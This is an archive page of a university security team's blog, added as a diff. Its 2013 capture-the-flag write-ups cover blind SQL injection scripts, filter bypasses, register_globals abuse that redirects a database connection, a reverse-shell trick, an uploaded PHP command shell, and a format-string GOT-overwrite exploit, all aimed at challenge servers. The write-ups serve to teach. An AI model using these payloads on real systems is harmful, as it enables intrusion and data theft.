@@ -1,0 +1,1294 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="banking We found a SQL injection vulnerability in the list page. When we use the funtion listing('balance', 'desc'), we will get the list of users &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/blog/page/4">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/secuinsidectf-2013-web-banking-writeup/">secuinsideCTF 2013 Web Banking Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>banking</h2>
+
+<p>We found a SQL injection vulnerability in the list page.</p>
+
+<p>When we use the funtion <code>listing('balance', 'desc')</code>, we will get the list of users ordered by <code>balance</code>.</p>
+
+<p>The sql query seems to be</p>
+
+<pre><code>select user,balance from user_accounts order by $o $b;
+</code></pre>
+
+<p>$o and $b is the two parameters of function listing();</p>
+
+<p>$o is filtered, but $b is injectable.</p>
+
+<p>For eaxmple, <code>listing('balance', 'limit 0,1')</code>; returns only one result.</p>
+
+<p>The following queries returns different result.</p>
+
+<pre><code>select user,balance from user_accounts order by user, If(2&amp;gt;1, 1, select table_name from information_schema.tables)
+select user,balance from user_accounts order by user, If(2&amp;lt;1, 1, select table_name from information_schema.tables)
+</code></pre>
+
+<p>We wrote a python script to switch protocols from HTTP to WebSocket. (by Flanker)</p>
+
+<pre><code>from SimpleHTTPServer import SimpleHTTPRequestHandler
+from BaseHTTPServer import BaseHTTPRequestHandler
+from BaseHTTPServer import HTTPServer
+from urlparse import urlparse, parse_qs
+import SocketServer
+from websocket import create_connection
+import json
+
+class MyHTTPRequestHandler(BaseHTTPRequestHandler):
+
+    def do_GET(self):
+        enc = &amp;#039;utf-8&amp;#039;
+        self.send_response(200)
+        self.send_header(&amp;quot;Content-type&amp;quot;, &amp;quot;text/html;charset%s&amp;quot; % enc)
+        self.end_headers()
+        url = self.path
+        d = parse_qs(urlparse(url).query)
+        print d
+        cmd = &amp;quot;list_init&amp;quot;
+        if &amp;quot;cmd&amp;quot; in d:
+            cmd = d[&amp;quot;cmd&amp;quot;][0]
+        o = None
+        if &amp;quot;o&amp;quot; in d:
+            o = d[&amp;quot;o&amp;quot;][0]
+        b = None
+        if &amp;quot;b&amp;quot; in d:
+            b = d[&amp;quot;b&amp;quot;][0]
+        print o, b
+        if o is not None and b is not None:
+            result = json.loads(self.ws_fetch(cmd, o, b))
+            users = json.loads(result[&amp;quot;m&amp;quot;])
+            self.wfile.write(len(users))
+##            for user in users:
+##                self.wfile.write(&amp;quot;&lt;tr&gt;\n")
+##                self.wfile.write(("&lt;th&gt;%s&lt;/th&gt;\n" % user["user"]).encode("utf-8"))
+##                self.wfile.write(("&lt;th&gt;%s&lt;/th&gt;\n" % user["balance"]).encode("utf-8"))
+##                self.wfile.write("&lt;/tr&gt;")
+
+##            self.wfile.write("&lt;/table&gt;")
+
+    def ws_fetch(self, cmd, o, b):
+        s = json.dumps({"cmd": cmd, "o": o,"b":b})
+        print s
+        fetched = False
+        while not fetched:
+            try:
+                ws = create_connection("ws://1.234.27.139:38090/banking")
+                ws.send(s)
+                ret = ws.recv()
+                fetched = True
+                return ret
+            except Exception as e:
+                print "err"
+                print e
+        return None
+
+    def do_POST(self):
+        pass
+
+    def do_HEAD(self):
+        pass
+
+
+if __name__ == '__main__':
+    port = 8080
+
+    handler = SimpleHTTPRequestHandler
+
+    # httpd = SocketServer.TCPServer(("", port ), handler )
+    httpd = HTTPServer(('', port), MyHTTPRequestHandler)
+
+    print "Server is running at port", port
+    httpd.serve_forever()
+</code></pre>
+
+<p>Later we wrote a php script to do blind injection.</p>
+
+<pre><code>&amp;lt;?php
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+
+    function check($url)
+    {
+        global $ch;
+        curl_setopt($ch, CURLOPT_URL, $url);
+        echo &amp;quot;$url\n&amp;quot;;
+        $res = curl_exec($ch);
+        echo &amp;quot;$res\n&amp;quot;;
+        return $res;
+    }
+
+    function guess($column, $clause = &amp;quot;from information_schema.tables limit 0,1&amp;quot;, $length = 3)
+    {
+        $ret = &amp;quot;&amp;quot;;
+        $clause = urlencode($clause);
+        for ($i = 1; $i 1;
+                $url = "http://127.0.0.1:8080/?o=user&amp;amp;b=,If((select%20ascii(substring($column,$i,1))%20$clause)&amp;gt;=$mid,1,(select%20table_name%20from%20information_schema.tables))%20limit%200,1";
+                if (check($url)) $l = $mid+1;
+                else $r = $mid - 1;
+                echo "$l, $r\n";
+            }
+            $ret .= chr($r);
+            echo "$ret\n";
+        }
+        return $ret;
+    }
+
+    //echo guess("length(version())");
+    //echo guess("version()", 23);
+    //echo guess("length(table_name)", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 0,1");  // 13
+    //echo guess("table_name", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 0,1", 13);  //user_accounts
+    //echo guess("length(table_name)", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 1,1");  // 8
+    //echo guess("table_name", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 1,1", 8);   // flag_tbl
+    //echo guess("length(table_schema)", "from information_schema.tables where table_name=0x666c61675f74626c limit 0,1");   // 7
+    //echo guess("table_schema", "from information_schema.tables where table_name=0x666c61675f74626c limit 0,1", 7);    // flag_db
+    //echo guess("length(column_name)", "from information_schema.columns where table_name=0x666c61675f74626c limit 0,1");   // 4 flag
+    //echo guess("length(flag)", "from flag_db.flag_tbl limit 0,1");    // 21
+    //echo guess("flag", "from flag_db.flag_tbl limit 0,1", 21);    // TheG0d0fGrabs_M4dL1F3
+?&amp;gt;
+</code></pre>
+
+<p>The Flag is <code>TheG0d0fGrabs_M4dL1F3</code> .</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/secuinside-ctf-web-the-bank-robber-writeup/">Secuinside Ctf Web the Bank Robber Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>The Bank Robber</h2>
+
+<p>This is an excelent challenge. Thanks for the awesome CTF.</p>
+
+<p>We waste a lot of time in dealing with the SQL injection part.</p>
+
+<p>We found the SQL injection vulnerability in <code>./M.list</code> .</p>
+
+<p>The server use mod_rewrite to modify the incoming URL request. It seems that the sever split the URL by <code>'.'</code>.</p>
+
+<p>The SQL query is</p>
+
+<pre><code>    select * from hacked_list where $column like '%$word%' order by time desc;
+</code></pre>
+
+<p>When we GET <code>./M.list.idx.1</code>, it was translated to the query</p>
+
+<pre><code>    select * from hacked_list where idx like '%1%' order by time desc;
+</code></pre>
+
+<p>The $word is quoted, but idx seems to be not filtered.</p>
+
+<p><code>GET ./M.list.idx&amp;lt;30--.1</code> returns 29 results.</p>
+
+<p>At first, we use %23(&#8216;#&#8217;) to comment out the rest part of the query. But it seems useless. (We are not familiar with mod_rewrite&#8230;) Later, we found &#8216;&#8211;&#8217; took effect because &#8216;&ndash;&#8217; won&#8217;t be escaped.</p>
+
+<p><code>GET ./M.list.idx&amp;lt;=(select ascii(substring(user(),1,1)))-80--.1</code> </br></p>
+
+<p>We use blind injection to get some useless information such as user(), database(), version()&#8230;</p>
+
+<p>But we don&#8217;t know how to query the information_schema database to get more information about the database structure, because the <code>'.'</code> is used as the split point in the URL.</p>
+
+<p>Moreover, We don&#8217;t know how to use <code>order by 1</code> or <code>and 1=1</code> to gain deeper information about this injection. We thought the $column is strictly filtered.. We were confused then.</p>
+
+<p>Flanker accidently found that <code>./M.list.id%2bx.1</code> returns normal page. I fell deep in thought.</p>
+
+<p>I realized that the URL was unescaped twice (it is evident if I were familiar with mod_rewrite) and filtered space(<code>' '</code>). The transformation is <code>'%2b' =&amp;gt; '+' =&amp;gt; ' ' =&amp;gt; ''</code></p>
+
+<p>Then I knew how to use <code>'.'</code> in the query and what&#8217;s wrong with the <code>order by</code> and other clauses.</p>
+
+<p>I use <code>'%252e'</code> to represent <code>'.'</code> and <code>'%252f%252a%252a%252f'('/**/')</code> to represent <code>'&lt;br /&gt;&lt;br /&gt;
+'</code>. (In fact, <code>'/**/'</code> is also effective)</p>
+
+<p><code>order by</code> is filtered to <code>orderby</code>, but <code>order/**/by</code> is effective.</p>
+
+<p>I found <code>order/**/by/**/1</code> returns normal page, but <code>order/**/by/**/2</code> returns empty page, so there was only one column in the SQL query.</p>
+
+<p>But it went wrong when I constructed a &#8216;union select&#8217; query. Then I found &#8216;union&#8217;, &#8216;select&#8217; and &#8216;from&#8217; was filtered.</p>
+
+<p>GET <code>'./M.idx=1-select-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-union-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-from-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-unselection-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-selunionect-.1'</code> Empty</p>
+
+<p>GET <code>'./M.idx=1-frunselectionom-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-   frunselectionom-.1'</code> Normal</p>
+
+<p>so the filter function might be</p>
+
+<blockquote><blockquote><p>replace &#8216;select&#8217; to &#8221; in $column</p>
+
+<p>replace &#8216;union&#8217; to &#8221; in $column</p>
+
+<p>replace &#8216;from&#8217; to &#8221; in $column</p>
+
+<p>replace &#8216; &#8216; to &#8221; in $column</p></blockquote></blockquote>
+
+<p>It was easy to find that <code>'Select', 'Union', 'From'</code> were not filtered.</p>
+
+<p>So I use</p>
+
+<pre><code>http://1.234.27.139:61080/M.list.1=2%252f%252a%252a%252fUnion%252f%252a%252a%252fSelect%252f%252a%252a%252f1,column_name,3,4%252f%252a%252a%252fFrom%252f%252a%252a%252finformation_schema%252ecolumns%252f%252a%252a%252fwhere%252f%252a%252a%252ftable_name=0x6861636b65645f6c697374--.a
+</code></pre>
+
+<p>to view all the information in the database.</p>
+
+<p>We were stucked soon. Because there was nothing special in the database.</p>
+
+<p>But we found we could load files from the server. The only way to go on was to use load&#95;file() to read files from server. (load&#95;file() is also filtered so we use Load_File())</p>
+
+<p>Having tried many filenames, Flanker (again~) found the the <code>'/site/.htaccess'</code> is readable. So we could get some special information in source code.</p>
+
+<p>The HINT showed that the flag was in <code>'/var/lib/php5/FLAG'</code>, we could read the file through the vulnerability in the source code.</p>
+
+<pre><code> 45 if (!ini_get("register_globals")) extract($_GET);
+ ...
+ 47 include_once $_BHVAR['path_lib']."database.php";
+ 48 include_once $_BHVAR['path_module']."_system/functions.php";
+ ...
+ 64 $head = $_BHVAR['path_layout'].get_layout($_skin, 'head');
+ ...
+ 67 echo file_get_contents($head);
+ ...
+ 70     case "P" : echo file_get_contents($_BHVAR['path_page']."/".$_act."/_main.php"); break;
+ 71     case "M" : include_once $_BHVAR['path_module']."/".$_act."/_main.php"; break;
+</code></pre>
+
+<p>get_layout() was defined in <code>'./modules/_system/functions.php'</code></p>
+
+<pre><code> 10  function get_layout($layout, $pos){
+ 11     $result = mysql_query("select path from _BH_layout where layout_name='$layout' and position='$pos'");
+ 12     $row = mysql_fetch_array($result);
+ 13     if (!isset($row['path'])){
+ 14         if ($pos = 'head'){
+ 15             return "./reverted/h.htm";
+ 16         } else {
+ 17             return "./reverted/f.htm";
+ 18         }
+ 19     }
+ 20     return $row['path'];
+ 21  }
+</code></pre>
+
+<p>In line 45, we could register variables in $_GET, but it was escaped.</p>
+
+<p>In line 70/71, we could read/include files, but we could not truncate the suffix <code>'/_main.php'</code>.</p>
+
+<p>Since we could register globals, we could modify some variable such as <code>$_BHVAR</code>.</p>
+
+<p>The database connection settings were stored in <code>./lib/database.php</code>. If we change the $&#95;BHVAR[&lsquo;path&#95;lib&rsquo;], the <code>./lib/database.php</code> could not be included correctly, we could use our own mysql server to answer the query.</p>
+
+<p>Then we create a table for this challenge. Thanks aay for offerring vps.</p>
+
+<pre><code> create table _BH_layout(path varchar(50), layout_name varchar(50), position varchar(50));
+ insert _BH_layout values('../../../../../var/lib/php5/FLAG', '1', 'head');
+
+http://1.234.27.139:61080/Main_Site/TBR.php?_type=P&amp;_skin=1&amp;_BHVAR[path_module]=./modules/&amp;_BHVAR[db][host]=50.115.47.187&amp;_BHVAR[db][user]=BH&amp;_BHVAR[db][pass]=BHBH&amp;_BHVAR[db][name]=BH
+</code></pre>
+
+<p>key is&#8230; @<em>Y0UR&#95;EY3&#95;LEE_SIN</em>@</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/secuinside-ctf-quals-2013-givemeshell-writeup/">Secuinside CTF Quals 2013 Givemeshell Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Remote service only receives 5 bytes string and passes it to the system() function to execute a short shell command. Using redirection operator, we can get a remote interactive shell, just input:</p>
+
+<pre><code>sh&lt;&amp;4  // redirect stdin to socket fd 4
+sh&gt;&amp;4  // redirect stdout to socket fd 4
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/secuinside-2013-game-writeup/">Secuinside CTF Quals 2013 Game Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><blockquote><p><a href="http://war.secuinside.com/files/beist&amp;#95;attack&amp;#95;game3.exe  ">http://war.secuinside.com/files/beist&amp;#95;attack&amp;#95;game3.exe  </a>
+[Neo] Hmm&#8230;<br/>
+there is no clue to track down the criminals. But, there is one way I<br/>
+love to use. Getting myself into the virtual world. It risks my life,<br/>
+but saving the world is worth risking! I will get into the virtual<br/>
+world for clues!</p></blockquote>
+
+<p>When I download the file, I found it&#8217;s a simple shooting game like Salamander.<br/>
+I guess the target is killing all the enemies.<br/>
+After playing a while,the boss came out with 999999 HP.<br/>
+Yeah, It&#8217;s a game, so I start to run a popular game cheater Kingsoft Youxia V.<br/>
+I use the software search for 999999 in memory and change it to 3, then shoot the boss.</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/05/Windows-XP-Professional-2013-05-24-21-53-31.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/05/Windows-XP-Professional-2013-05-24-21-53-31-1024x621.png" alt="" width="625" height="379" class="alignnone size-large wp-image-551" /></a></p>
+
+<p>It&#8217;s simple and interesting, isn&#8217;t it?</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/secuinsidectf-2013-web-secure-revenge-writeup/">secuinsideCTF 2013 Web Secure Revenge Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-27T00:00:00+08:00" pubdate data-updated="true">May 27<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>This not a hard one.</p>
+
+<h3><strong>Bin Part</strong></h3>
+
+<p>mod_dontwebhack350.so is a php plugin which helps the upload site to filter files.</p>
+
+<p>Opening it with IDA, filtering function <em>dontwebhack input filter()</em> is founded. The code below catches our sight:</p>
+
+<pre><code>if ( check_extension_name(v12, dest, v15) == 1 )
+    *(_DWORD *)v15 = 1;
+if ( *(_DWORD *)v15 )
+    ap_log_cerror("mod_dontwebhack300.c", 141, 3, 0, v12, *((_DWORD *)v15 + 3), v9);
+if ( check_bad_php_string(src) == 1 )
+{
+    ap_log_cerror("mod_dontwebhack300.c", 144, 3, 0, v12, "Try again.", v9);
+    result = -1;
+}
+</code></pre>
+
+<p>As mentioned above, strings that the file contains and the file&#8217;s extension name are checked.</p>
+
+<p>After a bit more exploration, it is safe to draw the conlusion that only these extension names <em>&#8220;.php&#8221; &#8220;.phtml&#8221; &#8220;.ht&#8221;</em> can be executed.</p>
+
+<pre><code>.rodata:00000F75 aPhp            db 'php',0              ; DATA XREF: check_extension_name+31o
+.rodata:00000F79 aPhtml          db 'phtml',0            ; DATA XREF: check_extension_name:loc_ACFo
+.rodata:00000F7F a_ht            db '.ht',0              ; DATA XREF: check_extension_name:loc_AF8o
+</code></pre>
+
+<p>and these strings are forbiddened in the upload file:</p>
+
+<pre><code>.data:00003060 off_3060        dd offset a?            ; DATA XREF: check_bad_php_string+17o
+.data:00003060                                         ; "&amp;lt;?&amp;quot;
+.data:00003064                 dd offset aKey          ; &amp;quot;key&amp;quot;
+.data:00003068                 dd offset aFlag         ; &amp;quot;flag&amp;quot;
+.data:0000306C                 dd offset aLocate       ; &amp;quot;locate&amp;quot;
+.data:00003070                 dd offset aInclude      ; &amp;quot;include&amp;quot;
+.data:00003074                 dd offset aRequire      ; &amp;quot;require&amp;quot;
+.data:00003078                 dd offset aFopen        ; &amp;quot;fopen&amp;quot;
+.data:0000307C                 dd offset aPassthru     ; &amp;quot;passthru&amp;quot;
+.data:00003080                 dd offset aFpassthru    ; &amp;quot;fpassthru&amp;quot;
+.data:00003084                 dd offset aSystem       ; &amp;quot;system&amp;quot;
+.data:00003088                 dd offset asc_F37       ; &amp;quot;`&amp;quot;
+.data:0000308C                 dd offset aExecl        ; &amp;quot;execl&amp;quot;
+.data:00003090                 dd offset aOpen         ; &amp;quot;open&amp;quot;
+.data:00003094                 dd offset aPopen        ; &amp;quot;popen&amp;quot;
+.data:00003098                 dd offset aEscapeshellcmd ; &amp;quot;escapeshellcmd&amp;quot;
+</code></pre>
+
+<h3><strong>Web Part</strong></h3>
+
+<p>Easy to find this php script in <em>upload.txt</em>:</p>
+
+<pre><code>if($_SERVER[&amp;#039;REQUEST_METHOD&amp;#039;] == &amp;quot;POST&amp;quot;) 
+{
+
+    $uploaddir = &amp;#039;/var/www/uploads/&amp;#039; . md5(crypt($_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;], $_POST[&amp;#039;code&amp;#039;] )) . &amp;#039;/&amp;#039;;
+
+    if(is_dir($uploaddir) == false)
+        mkdir($uploaddir);
+    if(strstr($_FILES[&amp;#039;data&amp;#039;][&amp;#039;name&amp;#039;], &amp;quot;./&amp;quot;) != FALSE) {
+    exit;
+    }
+
+
+    if(strstr($_FILES[&amp;#039;data&amp;#039;][&amp;#039;name&amp;#039;], &amp;quot;../&amp;quot;) != FALSE) {
+        exit;
+    }
+    $uploadfile = $uploaddir . basename($_FILES[&amp;#039;data&amp;#039;][&amp;#039;name&amp;#039;]);
+    if (move_uploaded_file($_FILES[&amp;#039;data&amp;#039;][&amp;#039;tmp_name&amp;#039;], $uploadfile)) {
+            echo &amp;quot;alert('Success'); document.href='./';\n";
+    } else {
+            print "alert('failed'); document.href='./';";
+    }
+
+}
+else { ...
+</code></pre>
+
+<p>We find that the file folder name is produced by <code>md5(crypt($_SERVER["REMOTE_ADDR"], $_POST['code'] ))</code>.</p>
+
+<p>It&#8217;s time to upload some php scripts.Considering the fact that special functions are banned as mentioned in the bin part, if we want to execute some commands, we can use <em>assert()</em>.</p>
+
+<p>Such php file like this is to uploaded:</p>
+
+<p>Test it.To calculate the folder name and give the get data:</p>
+
+<pre><code>http://59.9.131.155:9852/uploads/2438fc3567fb30f9e4157e19fd5f8f1e/example.php?name=system('ls%20../../../')
+</code></pre>
+
+<p>Files and folders are listed.The next step is to find out the way to read the key file.<em>fopen()</em> and <em>die()</em> is to be used. <em>cat</em> command also takes effect.</p>
+
+<p>To see that all the functions which are used to read files in php script are banned by .so.</p>
+
+<p><strong>So the <em>get</em> variable is used due to no filtering on url.</strong></p>
+
+<pre><code>http://59.9.131.155:9852/uploads/2438fc3567fb30f9e4157e19fd5f8f1e/example.php?name=die(fread(fopen(%22/home/dwh_revenge/
+flags%22,%22r%22),filesize(%22/home/dwh_revenge/flags%22)))
+</code></pre>
+
+<p>Bingo!</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/secuinside-ctf-debugd-writeup/">Secuinside CTF 2013 Quals Debugd Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-27T00:00:00+08:00" pubdate data-updated="true">May 27<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>debugd is a 32-bit ELF, after open with IDA, we found function “service”:</p>
+
+<pre><code>senddata(fd, "1. gdb vuln\n");
+senddata(fd, "2. objdump vuln\n");
+senddata(fd, "3. memory info\n");
+senddata(fd, "4. Report to admin\n");
+senddata(fd, "5. Exit\n");
+recvdata(fd, s1, 3, 10);
+</code></pre>
+
+<p>if we type 4, report() is call, the code is below:</p>
+
+<pre><code>senddata(fd, "Title : ");
+recvdata(fd, title, 60, 10);
+senddata(fd, "Contents : ");
+recvdata(fd, contents, buff_len, 10);
+sprintf(command, "/home/solve1/script.py %s %s %s %s", contents, email, hello, title);
+if ( strchr(command, '`')
+    || strchr(command, '|')
+    || strchr(command, '&amp;amp;')
+    || strchr(command, '\'')
+    || strchr(command, '"')
+    || strchr(command, ';')
+    || strchr(command, '(')
+    || strchr(command, '{') )
+{
+    senddata(fd, "Nope\n");
+    result = 0;
+}
+else
+{
+    popen(command, "r");
+    content_len = strlen(contents);
+    printf("%d\n%d\n%s\n%s\n%s\n", buff_len, content_len, email, hello, contents);
+    senddata(fd, "Mail Sended\n");
+    result = 0;
+}
+</code></pre>
+
+<p>Function report() ask us to input Title(60 bytes), Contents and then execute &#8220;/home/solve1/script.py&#8221;.</p>
+
+<pre><code>size_t content_len; // eax@10
+char contents[256]; // [sp+2Ch] [bp-66Ch]@1
+char email[40]; // [sp+12Ch] [bp-56Ch]@1
+char hello[8]; // [sp+154h] [bp-544h]@1
+char v6[248]; // [sp+15Ch] [bp-53Ch]@1
+char command[1024]; // [sp+254h] [bp-444h]@1
+char title[56]; // [sp+654h] [bp-44h]@1
+int buff_len; // [sp+68Ch] [bp-Ch]@1
+</code></pre>
+
+<p>We found title is 56 bytes long, but we can input 60 bytes, so the last 4 bytes can overwrite buff_len. Then we can input as long Contents as we wanted. if contents is long enough, it can overwrite email[40], hello[8], v6[246], but not command. because if the last byte of v6[246] is not null, sprintf will get into circulation of move command to command.</p>
+
+<p>In script.py, it execute /home/solve1/vuln, with argument argv[3], which is hello[8] from debugd. And then send the output of vuln to email argv[2], which is email[40] from debugd. The code is follow:</p>
+
+<pre><code>to = sys.argv[2]
+msg = MIMEText(data)
+msg['subject'] = "hello"
+msg['From'] = sender
+msg['To'] = to
+
+data = os.popen("/home/solve1/vuln "+"'"+sys.argv[3]+"'").read()
+</code></pre>
+
+<p>From the vulnarability of debugd, wo can construct the the parameter to vuln, and change the email destination to ours.</p>
+
+<p>We can type 2 to dump the assembly code of vuln, the main() function is very simple, after copy argv&#91;1] to local buffer [sep+0x20&#93;(this buffer is 0x100 byte long, and strncpy&rsquo;s third parameter specify the maxlen to 0x100), then it copy argv[1] to global buffer 0x804a060, and call printf function to print the buffer [esp+0x20], the all code is below:</p>
+
+<pre><code>push   %ebp
+mov    %esp,%ebp
+and    $0xfffffff0,%esp
+sub    $0x120,%esp
+mov    0x8(%ebp),%eax
+mov    %al,0x1c(%esp)           ;argc
+mov    0xc(%ebp),%eax           ;argv
+add    $0x4,%eax
+mov    (%eax),%eax              ;argv[1]
+movl   $0x100,0x8(%esp)
+
+mov    %eax,0x4(%esp)
+lea    0x20(%esp),%eax
+mov    %eax,(%esp)
+call   8048370  ;argv[1]-&amp;gt;esp+20
+mov    0xc(%ebp),%eax
+add    $0x4,%eax
+mov    (%eax),%eax
+movl   $0x100,0x8(%esp)
+
+mov    %eax,0x4(%esp)
+movl   $0x804a060,(%esp)
+call   8048370  ;argv[1]-&amp;gt;0x804a060
+lea    0x20(%esp),%eax
+mov    %eax,(%esp)
+call   8048330      ;printf(esp+20)
+movl   $0x804a060,(%esp)
+call   8048340      ;getenv(0x804a060)
+mov    $0x0,%eax
+leave  
+ret
+</code></pre>
+
+<p>We can use the format vulnarability of printf to overwrite the got table of getenv() to execute our shell code, the exploit code is as follow:</p>
+
+<pre><code>sock.send('4\x0A')
+print sock.recv(1024)
+sock.send('a'*56+'\x01\x01\x01\x40')
+print sock.recv(1024)
+sock.send("a"+"\x00"*255+myemail+"\x00"*(40-myemail)+"\x12\xa0\x04\x08"+"\x10\xa0\x04\x08"+"%2044u%8\$hn%39035u%9\$hn"+shellcode+"\x0A")
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/baltctf-2013-crypto10/">BaltCTF 2013 Crypto 100</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-14T00:00:00+08:00" pubdate data-updated="true">May 14<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>this task is described as below:</p>
+
+<pre><code>USS ENTERPRISE [100]  
+crypto  
+Hello we intercepted strange message. Decode it.  
+pySpIl. wmqDp oDl! nQSamn lIjngychoIl tDt nDn'Do  
+Hint. They use primitive cryptosystem.  
+</code></pre>
+
+<p>after some time we get hint:&#8221;Veni, Vidi, Vici&#8221;</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/baltctf-2013-crypto10/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/baltctf-2013-binary-500/">BaltCTF 2013 Binary 500</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-14T00:00:00+08:00" pubdate data-updated="true">May 14<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>binary500 is .net reserve.</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/baltctf-2013-binary-500/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/plaidctf-2013-crypto-compression250-writeup/">PlaidCTF 2013 Crypto Compression(250) Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-28T00:00:00+08:00" pubdate data-updated="true">Apr 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>We managed to get the source code for an encryption service running at</p>
+
+<p>54.234.224.216 :4433 OK</p>
+
+<pre><code>#!/usr/bin/python
+import os
+import struct
+import SocketServer
+import zlib
+from Crypto.Cipher import AES
+from Crypto.Util import Counter
+
+# Not the real keys!
